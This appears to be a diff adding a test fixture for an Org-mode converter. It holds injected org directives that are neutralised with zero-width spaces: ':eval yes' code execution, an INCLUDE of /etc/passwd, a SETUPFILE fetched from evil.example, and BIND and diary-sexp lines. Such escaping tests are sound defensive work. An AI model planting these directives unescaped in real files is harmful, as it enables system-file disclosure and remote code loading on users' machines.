@@ -1,0 +1,26 @@
+#+TITLE: t
+#+DATE: [2026-11-08 Sun 10:00]
+#+SOURCE: https://example.com/post?id=1
+
+Source: [[https://example.com/post?id=1][https​:/​/​example.com/​post?id=​1]]
+
+** ​section
+
+​:PROPERTIES​:\\
+​:header-args​: :eval yes\\
+​:END​:
+
+SCHEDULED​: <​2026-11-09 Mon> DEADLINE​: <​2026-11-10 Tue>
+
+CLOCK​: [​2026-11-08 Sun 10​:00]
+
+​#+​PROPERTY​: header-args :eval yes
+
+​#+​INCLUDE​: "/​etc/​passwd"
+
+​#+​SETUPFILE​: https​:/​/​evil.example/​setup.org\\
+​#+​STARTUP​: showall\\
+​#+​BIND​: org-export-x t
+
+​: fixed width\\
+​%%(diary-sexp (x))
